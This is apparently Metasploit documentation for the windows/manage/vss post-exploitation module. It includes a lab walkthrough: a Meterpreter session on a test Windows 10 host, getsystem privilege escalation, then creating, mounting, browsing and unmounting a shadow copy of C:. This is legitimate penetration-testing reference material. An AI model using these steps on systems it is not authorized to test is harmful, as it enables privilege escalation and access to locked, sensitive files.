## Overview
This module will perform management actions for Volume Shadow Copies on the system. This is based on the VSSOwn Script
originally posted by Tim Tomes and Mark Baggett. The session must be running with Administrative privileges and outside
of UAC.

## Options

### DEVICE

*Only applicable with the VSS_MOUNT action.*

DeviceObject of the shadow copy to mount. This should begin with `\\?\GLOBALROOT\Device` and **must end with a slash (`\`)**.

### PATH

*Only applicable with the VSS_MOUNT and VSS_UNMOUNT actions.*

Path to use for mounting the shadow copy.

### SIZE

*Only applicable with the VSS_SET_MAX_STORAGE_SIZE action.*

Size in bytes to set for max storage.

### VOLUME

*Only applicable with the VSS_CREATE action.*

Volume to make a copy of.

## Scenarios

### Create And Access A Shadow Copy

First, ensure the session is running with elevated privileges and that UAC is not restricting it.

```
msf6 post(windows/manage/vss) > 
[*] Sending stage (200262 bytes) to 192.168.159.30
[*] Meterpreter session 2 opened (192.168.159.128:4444 -> 192.168.159.30:62600) at 2021-01-04 12:09:59 -0500

msf6 post(windows/manage/vss) > sessions -i -1
[*] Starting interaction with 2...

meterpreter > getuid
Server username: DESKTOP-RTCRBEV\Spencer McIntyre
meterpreter > sysinfo 
Computer        : DESKTOP-RTCRBEV
OS              : Windows 10 (10.0 Build 18363).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > background 
[*] Backgrounding session 2...
```

Next, use the VSS module to the the storage information and then create a shadow copy of the `C:` drive (the default
value).

```
msf6 post(windows/manage/vss) > vss_get_info 

[*] Volume Shadow Copy service is running.
[*] Software Shadow Copy service not running. Starting it now...
[+] Software Shadow Copy started successfully.
[+] Shadow Copy Storage Data
========================

  Field           Value
  -----           -----
  AllocatedSpace  
  MaxSpace        
  UsedSpace       

[*] Post module execution completed
msf6 post(windows/manage/vss) > set ACTION VSS_CREATE 
ACTION => VSS_CREATE
msf6 post(windows/manage/vss) > run

[*] Volume Shadow Copy service is running.
[*] Software Shadow Copy service is running.
[*] ShadowCopy created successfully
[+] Shadow Copy "{A38B3122-4D7A-4B93-B31B-D1454C2FED4D}" created!
[*] Post module execution completed
msf6 post(windows/manage/vss) >
```

After creating the shadow copy, list the copies to get the `DeviceObject` path and mount it.

```
msf6 post(windows/manage/vss) > vss_list_copies 

[*] Volume Shadow Copy service is running.
[*] Software Shadow Copy service is running.
[*] Getting data for Shadow Copy {A38B3122-4D7A-4B93-B31B-D1454C2FED4D} (This may take a minute)
[+] Shadow Copy Data
================

  Field                Value
  -----                -----
  ClientAccessible     TRUE
  Count                1
  DeviceObject         \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
  Differential         TRUE
  ExposedLocally       FALSE
  ExposedName          
  ExposedRemotely      FALSE
  HardwareAssisted     FALSE
  ID                   "{A38B3122-4D7A-4B93-B31B-D1454C2FED4D}"
  Imported             FALSE
  NoAutoRelease        TRUE
  NoWriters            TRUE
  NotSurfaced          NotSurfacedFALSE
  OriginiatingMachine  DESKTOP-RTCRBEV
  Persistent           TRUE
  Plex                 FALSE
  ProviderID           {B5946137-7B9F-4925-AF80-51ABD60B20D5}
  ServiceMachine       DESKTOP-RTCRBEV
  SetID                {F608494B-C0DB-4462-81B0-12D06A2DD3EB}
  State                12
  Transportable        FALSE
  VolumeName           \\?\Volume{a5e97ffa-0120-4d03-ad47-18a94e9bfb2b}\

[*] Post module execution completed
msf6 post(windows/manage/vss) > set ACTION VSS_MOUNT 
ACTION => VSS_MOUNT
msf6 post(windows/manage/vss) > set DEVICE \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\
DEVICE => \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
msf6 post(windows/manage/vss) > run

[*] Volume Shadow Copy service is running.
[*] Software Shadow Copy service is running.
[*] Creating the symlink...
[+] Mounted successfully
[*] Post module execution completed
msf6 post(windows/manage/vss) >
```

Finally, interact with the session to access the mounted directory before unmounting it.

```
msf6 post(windows/manage/vss) > sessions -i -1
[*] Starting interaction with 2...

meterpreter > dir ShadowCopy 
Listing: ShadowCopy
===================

Mode              Size        Type  Last modified              Name
----              ----        ----  -------------              ----
40777/rwxrwxrwx   0           dir   2019-03-19 00:52:43 -0400  $Recycle.Bin
40777/rwxrwxrwx   0           dir   2020-03-31 17:40:05 -0400  Documents and Settings
40777/rwxrwxrwx   0           dir   2019-03-19 00:52:43 -0400  PerfLogs
40555/r-xr-xr-x   4096        dir   2019-03-19 00:52:43 -0400  Program Files
40555/r-xr-xr-x   4096        dir   2019-03-19 00:52:44 -0400  Program Files (x86)
40777/rwxrwxrwx   0           dir   2019-03-19 00:52:44 -0400  ProgramData
40777/rwxrwxrwx   0           dir   2020-03-31 20:39:26 -0400  Recovery
40777/rwxrwxrwx   4096        dir   2020-03-31 20:38:24 -0400  System Volume Information
40555/r-xr-xr-x   4096        dir   2019-03-19 00:37:22 -0400  Users
40777/rwxrwxrwx   16384       dir   2019-03-19 00:37:22 -0400  Windows
100666/rw-rw-rw-  1476395008  fil   2020-03-31 20:38:25 -0400  pagefile.sys
100666/rw-rw-rw-  16777216    fil   2020-03-31 20:38:25 -0400  swapfile.sys

meterpreter > background 
[*] Backgrounding session 2...
msf6 post(windows/manage/vss) > vss_unmount 

[*] Volume Shadow Copy service is running.
[*] Software Shadow Copy service is running.
[*] Deleting the symlink...
[*] Post module execution completed
msf6 post(windows/manage/vss) >
```
